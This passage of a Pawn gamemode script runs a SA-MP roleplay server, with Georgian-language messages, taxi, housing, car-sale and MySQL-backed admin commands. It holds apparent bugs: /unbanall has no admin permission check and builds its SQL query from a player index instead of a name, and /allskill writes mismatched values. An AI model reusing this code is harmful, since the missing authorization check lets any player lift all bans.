		SendClientMessage(playerid,CGREEN,"Sheni Shetyobineba Avtomaturad Daiwera OOC Chatshi (/b)");
		new mes2[128];
		format(mes2,sizeof(mes2),"/b %s",text);
		OnPlayerCommandText(playerid,mes2);
		return false;
	}
	if(GetPVarInt(playerid,"pOff") > gettime())
	{
		SendClientMessage(playerid,CGRAY,"Scadet. Gaimeorot Ramdenime Wamis Shemdeg");
		return false;
	}
	SetPVarInt(playerid,"pOff",gettime()+1);
	if(GetPVarInt(playerid,"Ether") == 1)
	{
	    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGRAY,"Pirdapir Etershi Chasartavad, Chajeqit Manqanis Ukana Mxares");
		format(mes,sizeof(mes),"[Radiosadguri] %s: %s",Name2(playerid),text);
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(!IsPlayerConnected(i)) continue;
			SendClientMessage(i,CRADIO,mes);
		}
		return false;
	}
	if(gNewsDialee == playerid)
	{
		format(mes,sizeof(mes),"[Radiosadguri] %s [Tel.]: %s",Name2(playerid),text);
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(!IsPlayerConnected(i)) continue;
			SendClientMessage(i,CRADIO,mes);
		}
		return false;
	}
	if(GetPVarInt(playerid,"pCall") == 1)
	{
		new id;
		if(gCalls[playerid][g_caller] == playerid) id = gCalls[playerid][g_callee];
		else if(gCalls[playerid][g_callee] == playerid) id = gCalls[playerid][g_caller];
		else return SendClientMessage(playerid,CGRAY,"Shecdoma (#112)");
		format(mes,sizeof(mes),"[T] %s",text);
		SendClientMessage(playerid,CYELLOW,mes);
		format(mes,sizeof(mes),"[T] %s: %s",Name2(playerid),text);
		SendClientMessage(id,CYELLOW,mes);
		return false;
	}
	Speech(playerid,text);
	return false;
}
public OnPlayerCommandText(playerid, cmdtext[])
{
    printf("OnPlayerCommandText(%s[%d], %s)", Name2(playerid), playerid, cmdtext);
	if(GetPVarInt(playerid,"pOff") > gettime()) return SendClientMessage(playerid,CGRAY,"Scadet. Gaimeorot Ramdenime Wamis Shemdeg..");
	SetPVarInt(playerid,"pOff",gettime()+1);
	if(GetPVarInt(playerid,"Logined") == 0) return true;
	new cmd[128], idx, tmp[128];
	cmd = strtok(cmdtext, idx);
	if(!strcmp(cmd, "/find", true))
  	{
  	    if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Funqcia Mxolod Xelmisawvdomia Police/FBI");
  	    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Avtomobilshi");
  	    if(GetPVarInt(playerid,"Marked") == 1) return SendClientMessage(playerid,CGRAY,"Signali Satelitze Gaigzavna Daelodet Dasrulebas");
     	tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp)) return  SendClientMessage(playerid, CGRAY, "/find [ID Motamashis]");
	    new id = strval(tmp);
   		SetPVarInt(playerid,"Marked",1);
		SetTimerEx("SetMark",5000,0,"dd",playerid,id);
		SendClientMessage(playerid,CGREEN,"Kitxva Gagzavnilia Daelodet Tanamgzavris Pasuxs.");
 	}
 	if(!strcmp(cmd,"/veh",true))
	{
		if(pData[playerid][pAdmin] < 4) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CRED,"/veh [id Auto] [Feri 1] [Feri 2]");
		new c1,c2,vehmod;
		vehmod = strval(tmp);
		if(vehmod < 400 || vehmod > 611 || vehmod == 432) return true;
		tmp = strtok(cmdtext, idx);
		if(strlen(tmp)) c1 = strval(tmp);
		else c1 = random(128);
		tmp = strtok(cmdtext, idx);
		if(strlen(tmp)) c2 = strval(tmp);
		else c2 = random(128);
		new Float:x, Float:y, Float:z;
		GetPlayerPos(playerid,x,y,z);
		x += 1.5;
		new vehid = CreateVehicle(vehmod,x,y,z,0.0,c1,c2,-1);
		LinkVehicleToInterior(vehid,GetPlayerInterior(playerid));
		SFCM(playerid,CGREEN,"Amorcheuli Manqana Warmatebit Gachnda.",vehid);
		gVehicles[vehid-1][vX] = x;
		gVehicles[vehid-1][vY] = y;
		gVehicles[vehid-1][vZ] = z;
		gVehicles[vehid-1][vFuel] = 100;
		gVehicles[vehid-1][vLock] = 0;
		return true;
	}
	if(!strcmp(cmd,"/givecloth",true))
	{
	    ShowPlayerDialog(playerid,dCloth1,2,"{31B571}Amoirchiet Tansacmeli","1. Chveulebrivi\n2. Organizaciis","Archeva","Daxurva");
     	return true;
	}
	if(!strcmp(cmd,"/clothes",true))
 	{
		//if(Get
		if(!pData[playerid][pFractionSkin]) return SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Sxva Tansacmeli.");
	    if(GetPlayerSkin(playerid) == pData[playerid][pFractionSkin])
	    {
	        SetPlayerSkin(playerid,pData[playerid][pSkin]);
	        ApplyAnimation(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0);
	    }
	    else if(GetPlayerSkin(playerid) == pData[playerid][pSkin])
	    {
	        SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
	        ApplyAnimation(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0);
	    }
		return true;
	}
	if(!strcmp(cmd,"/menu",true) || !strcmp(cmd,"/mm",true))
	{
		ShowPlayerDialog(playerid,dPlayerMenu,2,"{31B571}Main Menu","1. Commands\n2. Report\n3. Usaprtxoeba\n4. Donate","OPEN","CLOSE");
		return true;
	}
	if(!strcmp(cmd,"/taxi",true))
	{
		if(pData[playerid][pJob] != 3) return SendClientMessage(playerid,CGRAY,"Tqven Arxart Taqsis Mdzgoli");
		if(pTemp[playerid][pTaxiID] == INVALID_VEHICLE_ID) return SendClientMessage(playerid,CGRAY,"Aucilebelia Iqiraot Taqsi");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || GetPlayerVehicleID(playerid) != pTemp[playerid][pTaxiID]) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Tqveni Taqsis Rultan");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CRED,"/taxi [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(actplayerid == playerid) return SendClientMessage(playerid,CGRAY,"Tqven Ver Moitxovt Am Adgilas Taqsis");
		if(!IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		new vehicleid = GetPlayerVehicleID(playerid);
		if(GetPlayerState(actplayerid) != PLAYER_STATE_PASSENGER || GetPlayerVehicleID(actplayerid) != vehicleid) return SendClientMessage(playerid,CGRAY,"Tqven Taqshi Unda Gejdet Mgzavri");
		format(mes,sizeof(mes),"%s'm Moitxova Taqsi Am Adgilas",Name2(actplayerid));
		SendClientMessage(playerid,CINFO,mes);
		format(mes,sizeof(mes),"Taqsis Mdzgoli {"#cWHITE"}%s {"#cINFO"} Danishnulebis Adgilas Motxovna Gaketebulia.",Name2(playerid));
		SendClientMessage(actplayerid,CINFO,mes);
		SendClientMessage(actplayerid,CINFO,"Aiget Ruka da Monihsnet Adgili Sadac Gsurt Wasvla");
		SetPVarInt(actplayerid,"selectpoint",1);
		SetPVarInt(actplayerid,"taxidriver",playerid);
	}
	if(!strcmp(cmd,"/untaxi",true))
	{
		if(pData[playerid][pJob] != 3) return SendClientMessage(playerid,CGRAY,"Tqven Arxart Taqsis Mdzgoli");
		RemovePlayerMapIcon(playerid,iconTaxi);
	}
	if(!strcmp(cmd,"/fare",true))
	{
		if(pData[playerid][pJob] != 3) return SendClientMessage(playerid,CGRAY,"Tqven Arxart Taqsis Mdzgoli");
		if(pTemp[playerid][pTaxiID] == INVALID_VEHICLE_ID) return SendClientMessage(playerid,CGRAY,"Aucilebelia Iqiraot Taqsi");
		new vehicleid = GetPlayerVehicleID(playerid);
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || vehicleid != pTemp[playerid][pTaxiID]) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Tqveni Taqsis Rultan");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/fare [Fasi 10 Laridan]");
		new price = strval(tmp);
		if(price < 10 || price > 400) return SendClientMessage(playerid,CGRAY,"Fasi Ar Unda Iyos 10-Ze Naklebi Da 400-Ze Meti");
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(i == playerid) continue;
			if(GetPlayerVehicleID(i) == vehicleid)
			{
				SendClientMessage(playerid,CGRAY,"Tqven shegidzliat Shecvalot Fasi Mxolod Mashin Rodesac Zixart Manqanashi.");
				return true;
			}
		}
		pTemp[playerid][pTaxiPrice] = price;
		format(mes,sizeof(mes),"{3E8A5E}Taxi\n{ffffff}Fasi: {"#cYELLOW"}$%d",price);
		if(IsValid3DTextLabel(pTemp[playerid][pTaxi3DText])) DestroyDynamic3DTextLabelEx(pTemp[playerid][pTaxi3DText]);
		if(!IsValid3DTextLabel(pTemp[playerid][pTaxi3DText])) pTemp[playerid][pTaxi3DText] = CreateDynamic3DTextLabel(mes,CWHITE,0.0,0.0,1.5,20.0,INVALID_PLAYER_ID,vehicleid);
		return true;
	}
	if(!strcmp(cmd,"/reporton",true))
	{
 		if(pData[playerid][pAdmin] < 6) return true;
		if(reporti == 0)
		{
	    	SendClientMessage(playerid, COLOR_WHITE, "Reporti Chairto");
			reporti = 1;
		}
		else
		{
	    	SendClientMessage(playerid, COLOR_WHITE, "Reporti Gaitisha");
			reporti = 0;
		}
		return true;
	}
	if(!strcmp(cmd,"/hcar",true))
	{
		if(pData[playerid][pAdmin] < 6) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/hcar [ID Saxlis]");
		new houseid = strval(tmp);
		if(houseid < 1 || houseid > MAX_HOUSE_COUNT) return SendClientMessage(playerid,CGRAY,"Gamomushavebuli Limitebi");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGRAY,"Aucilebelia Iyot Manqanashi");
		new vehicleid = GetPlayerVehicleID(playerid);
		new Float:x, Float:y, Float:z, Float:r;
		GetVehiclePos(vehicleid,x,y,z);
		GetVehicleZAngle(vehicleid,r);
		new query[512];
		format(query,sizeof(query),"UPDATE `houses` SET `parkx`='%.4f', `parky`='%.4f', `parkz`='%.4f', `parkr`='%.4f' WHERE `id`='%d'",x,y,z,r,houseid);
		mysql_empty(mysql, query);
		SendClientMessage(playerid,CGREEN,"Saxltan Parkireba Dayenebulia");
		new i = houseid - 1;
		gHouses[i][houseParkX] = x;
		gHouses[i][houseParkY] = y;
		gHouses[i][houseParkZ] = z;
		gHouses[i][houseParkR] = r;
	}
	//new gBusinessTypeName[BUSINESS_TYPE_COUNT][24] = {"Прод. магазин","Закусочная","24/7","Бар","Клуб","Спортзал","Магазин одежды","Автомастерская"};
	if(!strcmp(cmd,"/createbizzbudko",true))
	{
		if(pData[playerid][pAdmin] < 6) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/createbizzbudko [type] [bint] [price] [name]");
		new type = strval(tmp);
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/createbizzbudko [type] [bint] [price] [name]");
		new bint = strval(tmp);
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/createbizzbudko [type] [bint] [price] [name]");
		new price = strval(tmp);
		new name[128];
		name = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/createbizzbudko [type] [bint] [price] [name]");
		mysql_real_escape_string(name,name);
		new Float:x, Float:y, Float:z, Float:r;
		GetPlayerPos(playerid,x,y,z);
		GetPlayerFacingAngle(playerid,r);
		new query[256];
		format(query,sizeof(query),"INSERT INTO `business` VALUES('','%s','%d','%d','0','%d','0','0','0','1','%f','%f','%f','%f','','','','')",name,type,bint,price,x,y,z,r);
		mysql_empty(mysql, query);
		CreateDynamicPickup(19132,1,x,y,z);
		SendClientMessage(playerid,CGREEN,"Sheqmnilia Biznesi");
	}
	if(!strcmp(cmd,"/bints",true))
	{
		if(pData[playerid][pAdmin] < 6) return true;
		if(!GetPVarFloat(playerid,"oldx"))
		{
			new mes2[350];
			for(new i;i<BINT_COUNT;i++) format(mes2,sizeof(mes2),"%s[%d] %s\n",mes2,i+1,gBints[i][bintName]);
			ShowPlayerDialog(playerid,dBints,2,"Binti",mes2,"OK","CLOSE");
		}
		else
		{
			new Float:x, Float:y, Float:z;
			x = GetPVarFloat(playerid,"oldx");
			y = GetPVarFloat(playerid,"oldy");
			z = GetPVarFloat(playerid,"oldz");
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			SetPlayerPos(playerid,x,y,z);
			DeletePVar(playerid,"oldx");
			DeletePVar(playerid,"oldy");
			DeletePVar(playerid,"oldz");
		}
	}
	if(!strcmp(cmd,"/hints",true))
	{
		if(pData[playerid][pAdmin] < 6) return true;
		if(!GetPVarFloat(playerid,"oldx"))ShowHintsDialog(playerid,dHints,"Naxva","Daxurva");
		else
		{
			new Float:x, Float:y, Float:z;
			x = GetPVarFloat(playerid,"oldx");
			y = GetPVarFloat(playerid,"oldy");
			z = GetPVarFloat(playerid,"oldz");
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			SetPlayerPos(playerid,x,y,z);
			DeletePVar(playerid,"oldx");
			DeletePVar(playerid,"oldy");
			DeletePVar(playerid,"oldz");
		}
		return true;
	}
	if(!strcmp(cmd,"/exit",true))
	{
		if(GetPVarInt(playerid,"IsInHouse") == 1)
		{
			new houseid = pTemp[playerid][pSelectedHouseID];
			new hint = gHouses[houseid][houseHint];
			new Float:x, Float:y, Float:z;
			x = gHints[hint][hintX];
			y = gHints[hint][hintY];
			z = gHints[hint][hintZ];
			if(IsPlayerInRangeOfPoint(playerid,2.0,x,y,z))
			{
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid,0);
				SetPVarInt(playerid,"JustTP",1);
				SetPlayerPos(playerid,gHouses[houseid][houseX],gHouses[houseid][houseY],gHouses[houseid][houseZ]);
				SetPlayerFacingAngle(playerid,gHouses[houseid][houseR]);
				SetPVarInt(playerid,"IsInHouse",0);
			}
		}
	}
	if(!strcmp(cmd,"/sellhouse",true))
	{
		if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Saxli.");
		if(pData[playerid][pCar]) return SendClientMessage(playerid,CGRAY,"Shen Gyavs Manqana. Jer Gayides Is Rata Gayido Saxli");
		new houseid = pData[playerid][pHouse]-1;
		if(!gHouses[houseid][houseOwner]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Saxlis Mplobeli");
		if(!GetString(Name2(playerid),gHouses[houseid][houseOwner])) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Saxlis Mplobeli");
		if(pTemp[playerid][pTaxiID] != INVALID_VEHICLE_ID || pTemp[playerid][pTaxiPass] != INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Ver Gamoiyenebt Mocemul Commands Axla [TAXI]");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SPFD(playerid,dSellHouse,0,"Gayide Saxli","YES","NO","{"#cWHITE"}Gindat Miyidot Saxli {"#cGREEN"}$%d?\n{"#cGRAY"}(Rom Miyido Saxli Motamashes, Dawere /sellhouse [ID Motamashis] [Fasi])",gHouses[houseid][housePrice]);
			return true;
		}
		new actplayerid = strval(tmp);
		tmp = strtok(cmdtext, idx);
		new price = strval(tmp);
		if(price < 1 || price > 200000000) return SendClientMessage(playerid,CGRAY,"Fasi Ar Unda Iyos Naklebi 1-Ze Da Meti 200-Ze.");
		if(!IsPlayerConnected(actplayerid) || playerid == actplayerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(pData[actplayerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Motamashes Ukve Aqvs Saxli.");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Shors Xart Ertmanetisgan");
		format(mes,sizeof(mes),"Tqven Shestavazet {"#cWHITE"}%s {"#cINFO"} Iyidos Tqveni Saxli",Name2(actplayerid));
		SendClientMessage(playerid,CINFO,mes);
		format(mes,sizeof(mes),"%s {"#cINFO"}Shemogtavazat Iyidot Es Saxli {"#cRED"}$%d{"#cINFO"}. Rom Daetanxmot Daajiret {"#cGREEN"}Y{"#cINFO"}, Winaagmdeg Shemtxvevashi {"#cRED"}N",Name2(playerid),price);
		SendClientMessage(actplayerid,CWHITE,mes);
		pTemp[playerid][pSellHouseOffer] = playerid;
		pTemp[actplayerid][pSellHouseOffer] = playerid;
		pTemp[actplayerid][pSellHouseOffee] = actplayerid;
		pTemp[actplayerid][pSellHousePrice] = price;
		pTemp[actplayerid][pSellHouseID] = houseid;
	}
	if(!strcmp(cmd,"/settle",true))
	{
		if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Saxli.");
		new houseid = pData[playerid][pHouse]-1;
		if(!GetString(Name2(playerid),gHouses[houseid][houseOwner])) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Im Saxlis Mepatrone Sadac Cxovrobt");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/settle [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(actplayerid == playerid || !IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(pData[actplayerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Motamashes Ukve Aqvs Saxli.");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		new cnt = gHouses[houseid][houseClass];
		for(new i;i<3;i++)
		{
			if(gHouses[houseid][houseHabitID][i]) cnt--;
		}
		if(!cnt) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Adgili Saxlshi.");
		format(mes,sizeof(mes),"Tqven Shestavazet {"#cWHITE"}%s {"#cINFO"} Icxovros Tqven Saxlshi.",Name2(actplayerid));
		SendClientMessage(playerid,CINFO,mes);
		format(mes,sizeof(mes),"%s {"#cINFO"}Shemogtavazat Icxovrot Mis Saxlshi. Dasatanxmeblad {"#cGREEN"}Y{"#cINFO"}, Uaryopistvis {"#cRED"}N",Name2(playerid));
		SendClientMessage(actplayerid,CWHITE,mes);
		pTemp[playerid][pSettleHouseOffer] = playerid;
		pTemp[actplayerid][pSettleHouseOffer] = playerid;
		pTemp[actplayerid][pSettleHouseOffee] = actplayerid;
		pTemp[actplayerid][pSettleHouseID] = houseid;
	}
	if(!strcmp(cmd,"/evict",true))
	{
		if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Saxli.");
		new houseid = pData[playerid][pHouse]-1;
		if(!GetString(Name2(playerid),gHouses[houseid][houseOwner])) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Im Saxlis Mplobeli Romelshic Cxobrobt");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/evict [ID Otaxis]");
		new slot = strval(tmp)-1;
		if(slot < 0 || slot > 2) return SendClientMessage(playerid,CGRAY,"Araswori ID Otaxis. Gamoiyenet /residents");
		if(!gHouses[houseid][houseHabitID][slot]) return SendClientMessage(playerid,CGRAY,"Am Otaxshi Aravin Ar Cxovrobs");
		new query[128];
		format(query,sizeof(query),"UPDATE `houses` SET `inhabit%did`='0', `inhabit%d`='' WHERE `id`='%d'",slot+2,slot+2,houseid+1);
		mysql_empty(mysql, query);
		if(mysql_errno()) return SendClientMessage(playerid,CRED,"Ошибка MySQL 1");
		format(query,sizeof(query),"UPDATE `members` SET `house`='0' WHERE `id`='%d'",gHouses[houseid][houseHabitID][slot]);
		mysql_empty(mysql, query);
		if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1");
		new actplayerid=INVALID_PLAYER_ID;
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(IsPlayerConnected(i) && pData[i][pMysqlID] == gHouses[houseid][houseHabitID][slot])
			{
				actplayerid = i;
				break;
			}
		}
		if(actplayerid != INVALID_PLAYER_ID)
		{
			pData[actplayerid][pHouse] = 0;
			SendClientMessage(actplayerid,CINFO,"Tqven Gamogasaxles Saxlidan.");
		}
		format(mes,sizeof(mes),"%s {"#cINFO"} Tqven Xart Gamosaxlebuli Tqveni Saxlidan.",gHouseHabits[houseid][slot]);
		SendClientMessage(playerid,CWHITE,mes);
		gHouses[houseid][houseHabitID][slot] = 0;
		strdel(gHouseHabits[houseid][slot],0,24);
	}
	if(!strcmp(cmd,"/residents",true))
	{
		if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Saxli.");
		new houseid = pData[playerid][pHouse]-1;
		if(!GetString(Name2(playerid),gHouses[houseid][houseOwner])) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Saxlis Mplobeli Sadac Cxovrobt");
		if(!gHouses[houseid][houseClass]) return SendClientMessage(playerid,CGRAY,"Tqven Saxlshi Araa Gamoyopili Adgili");
        new mes2[256];
		for(new i;i<3;i++)
		{
			if(gHouses[houseid][houseHabitID][i]) format(mes2,sizeof(mes2),"%s{"#cWHITE"}Otaxi[%d]: {"#cBLUE"}%s\n",mes2,i+1,gHouseHabits[houseid][i]);
		}
		if(!strlen(mes2)) format(mes2,sizeof(mes2),"{"#cGRAY"}Araa Mosaxle");
		ShowPlayerDialog(playerid,dMes,0,"Mosaxleebi",mes2,"OK","");
	}
	if(!strcmp(cmd,"/sellcar",true))
	{
		if(!pData[playerid][pCar] || (!pData[playerid][pHouse])) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gyavt Avtomobili.");
		if(pTemp[playerid][pTaxiID] != INVALID_VEHICLE_ID || pTemp[playerid][pTaxiPass] != INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Tqven Ver Gamoiyenebt Am Commands Axla  [TAXI]");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			new mes2[128];
			format(mes2,sizeof(mes2),"{"#cWHITE"}Tqven Gindat Mityidot Tqveni Avtomobili{"#cGREEN"}$%d?",VehiclesIndent[pData[playerid][pCarID]][Price]/2);
			ShowPlayerDialog(playerid,dSellCar,0,"Iyideba Avtomobili",mes2,"YES","NO");
		}
		else
		{
			new actplayerid = strval(tmp);
			if(actplayerid == playerid || !IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
			if(!pData[actplayerid][pHouse] ) return SendClientMessage(playerid,CGRAY,"Motamashes Araaqvs Saxli");
			new houseid = pData[actplayerid][pHouse]-1;
			if(!GetString(Name2(actplayerid),gHouses[houseid][houseOwner])) return SendClientMessage(playerid,CGRAY,"Manqanis Gamoyeneba Sheudzlia Mxolod Saxlis Mepatrones");
			if(pData[actplayerid][pCar]) return SendClientMessage(playerid,CGRAY,"Motamashe Ukve shen Manqanashia. Tu Gsurt Gacvla Manqanis Daweret : /changecar");
			if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
			tmp = strtok(cmdtext, idx);
			new price = strval(tmp);
			if(price < 1 || price > 50000000) return SendClientMessage(playerid,CGRAY,"Fasi Iwyeba 1-Gel Maximum 50 Mln-Mde.");
			new mes2[512];
			format(mes,sizeof(mes),"Tqven Shestavazet {"#cWHITE"}%s {"#cINFO"} Iyidos Tqveni Avtomobili",Name2(actplayerid));
			SendClientMessage(playerid,CINFO,mes);
			format(mes2,sizeof(mes2),"%s {"#cINFO"} Gtavazobt Sheidzinot Es Manqana {"#cRED"}$%d{"#cINFO"}.",Name2(playerid),price);
			SendClientMessage(actplayerid,CWHITE,mes2);
			SendClientMessage(actplayerid,CINFO,"Amis Dasadastureblad Daachiret {"#cGREEN"}Y{"#cINFO"}, Uaryofistvis {"#cRED"}N");
			pTemp[playerid][pSellCarOffer] = playerid;
			pTemp[actplayerid][pSellCarOffer] = playerid;
			pTemp[actplayerid][pSellCarOffee] = actplayerid;
			pTemp[actplayerid][pSellCarPrice] = price;
		}
	}
	if(!strcmp(cmd,"/skill",true))
	{
		 tmp = strtok(cmdtext, idx);
         if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/skill [ID Motamashis]");
         new id = strval(tmp);
 	     if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
 	     if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		 format(mes,sizeof(mes),"Tqven shestavazet {"#cWHITE"}%s {"#cINFO"}Naxet Tqveni Amonaweri tiri.",Name2(id));
		 SendClientMessage(playerid,CINFO,mes);
		 format(mes,sizeof(mes),"%s {"#cINFO"}Surs Gachvenot Tavisi Tiris Gamocdileba.",Name2(playerid));
		 SendClientMessage(id,CWHITE,mes);
		 SendClientMessage(id,CINFO,"Amis Dasadastureblad Daachiret {"#cGREEN"}Y{"#cINFO"}, Uaryofistvis {"#cRED"}N");
		 SetPVarInt(id,"1ShowDiplpl",playerid);
		 SetPVarInt(id,"1ShowDiplact",id);
		 return true;
 	}
	if(!strcmp(cmd,"/unbanall",true))
	{
		for(new i=0; i < MAX_PLAYERS; i++)
		{
  			if(pData[i][pBan])
  			{
  				pData[i][pBan] = 0;
  				new query[128];
				format(query,sizeof(query),"UPDATE `members` SET `ban` = '0' WHERE `nickname`='%s'",i);
				mysql_empty(mysql, query);
				format(query,sizeof(query),"[A] %s Unbanned %s",Name2(playerid),i);
				AdminChat(CORANGE,query);
  			}
		}
	}
	if(!strcmp(cmd,"/allskill",true))
	{
		tmp = strtok(cmdtext, idx);
  		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/allskill [ID Motamashis]");
  		new id = strval(tmp);
		if(pData[playerid][pAdmin] < 6) return true;
		pData[id][pPistol_Skill] = 10000;
		pData[id][pEagle_Skill] = 10000;
		pData[id][pShotGun_Skill] = 10000;
		pData[id][pMP5_Skill] = 10000;
		pData[id][pAK47_Skill] = 10000;
		pData[id][pM4_Skill] = 10000;
		pData[id][pSniper_Skill] = 10000;
		SendClientMessage(id,CGREEN,"Tqven Gagiumjobesdat Iaragis Skilebi Maximalur Doneze.");
		SendClientMessage(playerid,CGREEN,"SKILLebi Gacemulia.");
		new query[700];
		format(query,sizeof(query),"UPDATE `members` SET `Pistol_Skill` = '1000',`Eagle_Skill` = '1000',`ShotGun_Skill` = '1000',`MP5_Skill` = '1000',`AK47_Skill` = '1000',`M4_Skill` = '1000',`Sniper_Skill` = '1000' WHERE `nickname` = '%s'",Name2(id));
		mysql_empty(mysql, query);
		if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
	}
	if(!strcmp(cmd,"/diplomas",true))
	{
		 tmp = strtok(cmdtext, idx);
         if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/diplomas [ID Motamashis]");
         new id = strval(tmp);
 	     if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
 	     if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		 format(mes,sizeof(mes),"Tqven Shestavazet {"#cWHITE"}%s {"#cINFO"}Naxos Tqveni Diplomi.",Name2(id));
		 SendClientMessage(playerid,CINFO,mes);
		 format(mes,sizeof(mes),"%s {"#cINFO"}Surs Gachvenot Tavisi Diplomi.",Name2(playerid));
		 SendClientMessage(id,CWHITE,mes);
		 SendClientMessage(id,CINFO,"Amis Dasadastureblad Daachiret {"#cGREEN"}Y{"#cINFO"}, Uaryofistvis {"#cRED"}N");
		 SetPVarInt(id,"ShowDiplpl",playerid);
		 SetPVarInt(id,"ShowDiplact",id);
		 return true;
	}
	if(!strcmp(cmd,"/buygrain",true))
	{
		if(IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Мусорок? Вали отсюда.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, CGRAY, "/buygrain [Marcvlis Raodenoba] (1 Marcvali - 50$)");
		if(PlayerToPoint(3.0,playerid,322.1280,1118.8314,1083.8828)) {
			new ammo,string[128];
			ammo = strval(tmp);
			if(ammo > 1000 || ammo < 1) return SendClientMessage(playerid, CGRAY, "Yvelaze Naklebi 1 Da Meti 1000");
			if(GetPlayerMoneyEx(playerid) < ammo*50) return SendClientMessage(playerid, CGRAY, "Tqven Ar Gaqvt Sakmarisi Fuli.");
			TransferMoney(playerid,-1,ammo*50);
			pData[playerid][pGrain] += ammo;
			Pokaz(playerid,5,ammo,1);
